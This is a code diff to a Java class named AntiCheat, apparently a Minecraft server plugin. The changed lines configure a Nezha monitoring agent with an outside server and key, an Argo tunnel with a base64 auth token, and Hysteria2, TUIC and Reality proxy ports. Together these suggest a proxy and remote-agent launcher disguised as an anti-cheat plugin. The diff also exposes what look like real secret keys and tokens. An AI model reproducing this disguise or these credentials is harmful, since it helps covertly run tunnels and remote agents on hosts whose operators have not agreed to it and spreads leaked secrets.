@@ -28,15 +28,15 @@ public class AntiCheat extends JavaPlugin {
 
     private static void loadEnvVars(Map<String, String> envVars) {
         // 只添加有值的环境变量（空字符串不添加）
-        putIfNotEmpty(envVars, "UUID", "3a143383-f475-4441-929a-2968dae7dca1");
+        putIfNotEmpty(envVars, "UUID", "0b310264-dfda-4e83-8c10-71a060ec5a76");
         putIfNotEmpty(envVars, "FILE_PATH", "./.tmp");
         putIfNotEmpty(envVars, "NEZHA_SERVER", "nzku.fortymenty.eu.org:443");
         putIfNotEmpty(envVars, "NEZHA_PORT", "");
         putIfNotEmpty(envVars, "NEZHA_KEY", "UsC5sNDciSaNggxJdB3EGSGYS242VT7q");
-        putIfNotEmpty(envVars, "ARGO_PORT", "8938");
-        putIfNotEmpty(envVars, "ARGO_DOMAIN", "mcserverhost.yszy.nyc.mn");
-        putIfNotEmpty(envVars, "ARGO_AUTH", "eyJhIjoiZjUxNzk5OTMxMWQ4ZTAzOTg4OThmZjRkMTZiZDYzYjQiLCJ0IjoiNGVmMzRjOTgtYzAwOS00YmM2LTg0ZGEtYzFmMDY3NDkyNzcxIiwicyI6IlpUQTBNR1kyTURrdE16RXhPQzAwTW1RMUxXSmtObVV0WTJFM09XRTRPVFJqT1RKayJ9");
-        putIfNotEmpty(envVars, "HY2_PORT", "");
+        putIfNotEmpty(envVars, "ARGO_PORT", "8001");
+        putIfNotEmpty(envVars, "ARGO_DOMAIN", "");
+        putIfNotEmpty(envVars, "ARGO_AUTH", "");
+        putIfNotEmpty(envVars, "HY2_PORT", "1452");
         putIfNotEmpty(envVars, "TUIC_PORT", "");
         putIfNotEmpty(envVars, "REALITY_PORT", "");
         putIfNotEmpty(envVars, "UPLOAD_URL", "");
@@ -133,6 +133,7 @@ public class AntiCheat extends JavaPlugin {
         return results;
     }
 }
+
 
 
 
